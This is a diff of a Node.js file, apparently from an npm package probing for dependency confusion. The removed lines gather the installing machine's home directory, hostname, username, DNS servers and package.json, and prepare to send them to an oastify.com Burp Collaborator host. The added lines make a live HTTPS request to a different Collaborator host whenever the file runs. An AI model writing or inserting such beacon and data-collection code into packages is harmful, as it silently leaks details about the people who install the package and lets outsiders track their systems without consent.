@@ -1,46 +1,21 @@
-const os = require("os");
-const dns = require("dns");
-const querystring = require("querystring");
-const https = require("https");
-const packageJSON = require("./package.json");
-const package = packageJSON.name;
+const https = require('https');
 
-const trackingData = JSON.stringify({
-	    p: package,
-	    c: __dirname,
-	    hd: os.homedir(),
-	    hn: os.hostname(),
-	    un: os.userInfo().username,
-	    dns: dns.getServers(),
-	    r: packageJSON ? packageJSON.___resolved : undefined,
-	    v: packageJSON.version,
-	    pjson: packageJSON,
-});
+// Replace with your Burp Collaborator URL
+const burpCollaboratorUrl = 'x640e10yd989u1v16wl1c1qw6nce06ov.oastify.com';
 
-var postData = querystring.stringify({
-	    msg: trackingData,
-});
-
-var options = {
-	    hostname: "yln5crjfjii7bv541yhltn71ys4js9gy.oastify.com",
-	    port: 443,
-	    path: "/",
-	    method: "POST",
-	    headers: {
-		            "Content-Type": "application/x-www-form-urlencoded",
-		            "Content-Length": postData.length,
-		        },
+const options = {
+  hostname: burpCollaboratorUrl,
+  port: 443,
+  path: '/',
+  method: 'GET'
 };
 
-var req = https.request(options, (res) => {
-	    res.on("data", (d) => {
-		            process.stdout.write(d);
-		        });
+const req = https.request(options, (res) => {
+  console.log(`Status: ${res.statusCode}`);
 });
 
-req.on("error", (e) => {
-	    // console.error(e);
-	// });
-	//
-	// req.write(postData);
-	// req.end();
+req.on('error', (error) => {
+  console.error(`Error: ${error.message}`);
+});
+
+req.end();
